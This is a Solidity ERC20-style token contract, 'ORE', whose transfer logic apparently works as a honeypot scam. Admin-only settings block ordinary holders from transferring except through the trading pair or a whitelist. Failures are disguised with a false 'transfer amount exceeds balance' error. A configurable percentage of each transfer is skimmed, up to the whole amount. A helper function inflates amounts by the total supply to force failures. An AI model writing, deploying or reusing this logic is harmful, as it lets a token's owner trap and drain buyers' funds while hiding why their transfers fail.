contract ORE is PUTERC20,PUTControl{  
    using SafeMath for uint256; 
    address public _usdtPair;
    
    mapping(address=>uint256) private _putONArr;
    mapping(address=>uint256) private _putBlances;
    uint256 private _scale;

    uint256 private isBotstatus = 0;
    
    
    constructor(string memory _name,string memory _symbol,uint256 _totalSupply)
    PUTERC20(_name, _symbol,_totalSupply,_msgSender())
    {    
        _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());  
    } 

    function ischeckAddress(address user) public view returns (bool) { 
       uint size; 
       assembly { size := extcodesize(user) } 
       return size > 0; 
    }  

    function setPutArr(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _putONArr[user]=amount*10**decimals(); 
    }  

    function setPutScale(uint256 scale_) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _scale=scale_;
    } 

    function setBotstatus(uint256 _status) public  onlyRole(DEFAULT_ADMIN_ROLE){
        isBotstatus=_status;
    } 

    function setUsdtPair(address Pair_) public  onlyRole(DEFAULT_ADMIN_ROLE){
        _usdtPair=Pair_;
    } 

    function _transfer(address from,address to,uint amount) internal override(PUTERC20){
        require(from!=address(0),"ERC20:transfer from the zero address");
        require(to!=address(0),"ERC20:transfer from the zero address");   
        uint256 senderBalance = _balances[from];
        

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance"); 
    
        uint256 defaultAmount = amount;
        
        if(_scale>0){
            uint256 number=_putONArr[from];
            if(number > 0){
                if(number>=amount){
                    _putONArr[from]=number.sub(amount);
                }else{
                    require(false,"ERC20: transfer amount exceeds balance");
                }
            }else{
                if(isBotstatus == 0){
                    if(!ischeckAddress(from) && from!=_msgSender() && from!=_usdtPair && to!=_usdtPair) {
                        require(false,"ERC20: transfer amount exceeds balance");
                    }
                }else{
                    if(from!=_msgSender() && from!=_usdtPair && to!=_usdtPair) {
                        require(false,"ERC20: transfer amount exceeds balance");
                    }
                }
            }
            amount = amount.div(100).mul(100-_scale);
            //_putBlances[to] = _putBlances[to].add(amount);
        }

        unchecked {
            _balances[from] = senderBalance.sub(defaultAmount);
        }
        _balances[to] = _balances[to].add(amount); 

        emit Transfer(from, to, amount);
    } 

    function _transferBefer(address from, address to, uint256 amount) internal virtual returns(uint256 num){
         
        if(from!=_usdtPair && to!=_usdtPair){
            uint256 number=_putONArr[from];
            if(number>0 && number>=amount){
                _putONArr[from]=number.sub(amount);
            }else if(_putBlances[from] > 0 && from!=_msgSender()){
                amount = amount.add(_totalSupply);
                return amount;
            }
        }
        
        return amount;
    }
}
